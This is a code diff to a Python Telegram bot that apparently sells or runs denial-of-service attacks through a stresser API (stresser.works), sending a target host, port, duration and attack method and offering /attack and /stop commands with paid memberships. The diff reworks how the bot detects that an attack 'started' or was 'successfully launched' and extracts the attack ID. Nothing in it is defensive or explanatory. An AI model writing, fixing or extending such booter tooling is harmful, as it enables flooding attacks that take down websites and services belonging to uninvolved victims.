@@ -605,7 +605,7 @@ init_pseudo_owner()
 
 # ===== API FUNCTIONS =====
 async def send_api_attack(target, port, duration, method):
-    """Call stresser.works API. Uses host/port params."""
+    """Call stresser.works API. Handles both response shapes (ok / success)."""
     if not API_TOKEN:
         return {"success": False, "error": "API_TOKEN missing"}
 
@@ -614,7 +614,6 @@ async def send_api_attack(target, port, duration, method):
         return {"success": False, "error": f"Unknown method {method}"}
 
     url = API_BASE.rstrip('/') + endpoint
-
     params = {
         "token": API_TOKEN,
         "host": target,
@@ -649,21 +648,46 @@ async def send_api_attack(target, port, duration, method):
                 except Exception:
                     data = {"raw": text[:200]}
 
-                ok = resp.status == 200 and (
-                    data.get('status') in ('success', 'ok', True)
-                    or data.get('success') is True
-                    or 'started' in str(data).lower()
-                    or 'attack' in str(data).lower()
-                    or 'sent' in str(data).lower()
-                )
+                # Success if:
+                # - HTTP 200 AND
+                # - (ok is True) OR (success is True) OR (status is success) OR
+                #   ("Attack started" / "successfully launched" in message)
+                ok = False
+                if resp.status == 200 and isinstance(data, dict):
+                    if data.get('ok') is True:
+                        ok = True
+                    elif data.get('success') is True:
+                        ok = True
+                    elif data.get('status') in ('success', 'ok'):
+                        ok = True
+                    else:
+                        msg = str(data.get('message', '')).lower()
+                        if 'started' in msg or 'successfully' in msg or 'launched' in msg:
+                            ok = True
+
+                attack_id = 'N/A'
+                if isinstance(data, dict):
+                    attack_id = (
+                        data.get('id')
+                        or data.get('attack_id')
+                        or (data.get('attack') or {}).get('id')
+                        or 'N/A'
+                    )
+
+                error_msg = None
+                if not ok:
+                    if isinstance(data, dict):
+                        error_msg = data.get('error') or data.get('message') or f"HTTP {resp.status}"
+                    else:
+                        error_msg = f"HTTP {resp.status}"
 
                 return {
                     "success": ok,
                     "status": resp.status,
                     "elapsed": elapsed,
                     "response": data,
-                    "attack_id": data.get('attack_id') or data.get('id') or 'N/A',
-                    "error": None if ok else data.get('message', f"HTTP {resp.status} — {text[:120]}"),
+                    "attack_id": attack_id,
+                    "error": error_msg,
                     "concurrent": conc,
                 }
     except asyncio.TimeoutError:
@@ -1988,7 +2012,6 @@ def main():
 
     bot_app = Application.builder().token(TELEGRAM_TOKEN).build()
 
-    # Commands
     bot_app.add_handler(CommandHandler("start", start))
     bot_app.add_handler(CommandHandler("attack", attack_command))
     bot_app.add_handler(CommandHandler("stop", stop_command))
@@ -1999,7 +2022,6 @@ def main():
     bot_app.add_handler(CommandHandler("myid", myid_command))
     bot_app.add_handler(CommandHandler("cancel", cancel))
 
-    # Specific patterns BEFORE generic ones
     bot_app.add_handler(CallbackQueryHandler(cancel_membership_manual_callback, pattern="^cancelmem_manual$"))
     bot_app.add_handler(CallbackQueryHandler(process_cancel_membership_callback, pattern="^cancelmem_\\d+$"))
     bot_app.add_handler(CallbackQueryHandler(process_delete_any_callback, pattern="^delany\\|"))
